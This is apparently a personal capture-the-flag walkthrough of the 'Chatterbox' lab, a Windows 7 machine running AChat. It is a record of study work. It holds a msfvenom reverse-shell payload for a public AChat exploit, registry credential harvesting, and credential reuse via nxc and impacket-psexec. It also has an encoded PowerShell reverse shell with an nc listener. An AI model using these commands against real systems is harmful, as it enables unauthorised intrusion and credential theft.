## Chatterbox

### Lab Details 

- Difficulty: Medium
- Type: Service Enumeration, Credential Harvesting, Priv Esc, Windows

#### Enumeration
- run nmap
```bash
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
9256/tcp  open  tcpwrapped
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
```
- port `9256` looks interesting
- run `nmap` again against the port, found the service name
```bash
$ nmap 10.129.122.173 -p9256 -T4 --min-rate 1000 -sC -A
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-17 07:45 CDT
Nmap scan report for 10.129.122.173
Host is up (0.0020s latency).

PORT     STATE SERVICE VERSION
9256/tcp open  achat   AChat chat system
```
#### Initial Foothold 
- search online for `AChat vulnerability`, found (https://www.exploit-db.com/exploits/36025)
- modify the payload for a reverse shell using `msfvenom`
```bash
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.54 LPORT=4444 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```
- replace the payload in the script with the payload generated from `msfvenom`
- execute the script and we get a reverse shell as user `Alfred`
#### Lateral Movement (If any)

#### Privilege Escalation
- check if the DefaultPassword value exists 
```powershell
PS C:\Users\Alfred> Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "DefaultPassword" -ErrorAction SilentlyContinue


PSPath          : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWA
                  RE\Microsoft\Windows NT\CurrentVersion\Winlogon
PSParentPath    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWA
                  RE\Microsoft\Windows NT\CurrentVersion
PSChildName     : Winlogon
PSDrive         : HKLM
PSProvider      : Microsoft.PowerShell.Core\Registry
DefaultPassword : Welcome1!
```
- found password `Welcome1!`
- since `smb` is running on the target we can use `nxc` to check if we have the admin privilege with found password
```powershell
$ nxc smb 10.129.113.138 -u Administrator -p 'Welcome1!' -x whoami
[*] First time use detected
[*] Creating home directory structure
[*] Creating missing folder logs
[*] Creating missing folder modules
[*] Creating missing folder protocols
[*] Creating missing folder workspaces
[*] Creating missing folder obfuscated_scripts
[*] Creating missing folder screenshots
[*] Creating default workspace
[*] Initializing MSSQL protocol database
[*] Initializing WINRM protocol database
[*] Initializing LDAP protocol database
[*] Initializing SMB protocol database
[*] Initializing SSH protocol database
[*] Initializing VNC protocol database
[*] Initializing WMI protocol database
[*] Initializing FTP protocol database
[*] Initializing RDP protocol database
[*] Copying default configuration file
SMB         10.129.113.138  445    CHATTERBOX       [*] Windows 7 Professional 7601 Service Pack 1 x32 (name:CHATTERBOX) (domain:Chatterbox) (signing:False) (SMBv1:True)
SMB         10.129.113.138  445    CHATTERBOX       [+] Chatterbox\Administrator:Welcome1! (Pwn3d!)
SMB         10.129.113.138  445    CHATTERBOX       [+] Executed command via wmiexec
SMB         10.129.113.138  445    CHATTERBOX       chatterbox\administrator
```
- states that we have the `NT Authority\System` access
- we can use `impacket-psexec` to get a reverse shell on the target
```bash
$ impacket-psexec 'Administrator:Welcome1!@10.129.113.138'
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.113.138.....
[*] Found writable share ADMIN$
[*] Uploading file JZqrNLvA.exe
[*] Opening SVCManager on 10.129.113.138.....
[*] Creating service azUm on 10.129.113.138.....
[*] Starting service azUm.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
- attempt to read `root.txt` file located at Desktop directory under Administrator however getting access denied error, need to give permission to `nt authority\system`
```powershell
C:\Users\Administrator\Desktop> type root.txt
Access is denied.

C:\Users\Administrator\Desktop> whoami
nt authority\system
```
- work around is getting a `powershell` reverse shell instead of `cmd`, since calling `powershell` from the initial `cmd` shell hangs the connection 
```powershell
C:\Users\Administrator\Desktop> powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANQ<snip>
```
- on the `powershell` reverse shell we can give `nt authority\system` the permission to read `root.txt`
```powershell
$ nc -lnvp 9002
listening on [any] 9002 ...
connect to [10.10.14.54] from (UNKNOWN) [10.129.113.138] 49158

PS C:\Users\Administrator\Desktop> whoamni
PS C:\Users\Administrator\Desktop> whoami
nt authority\system
PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-ar--         9/17/2025   4:45 PM         34 root.txt     

PS C:\Users\Administrator\Desktop> icacls C:\Users\Administrator\Desktop\root.txt /grant SYSTEM:F
processed file: C:\Users\Administrator\Desktop\root.txt
Successfully processed 1 files; Failed processing 0 files
```
#### Resources

#### Lesson Learned
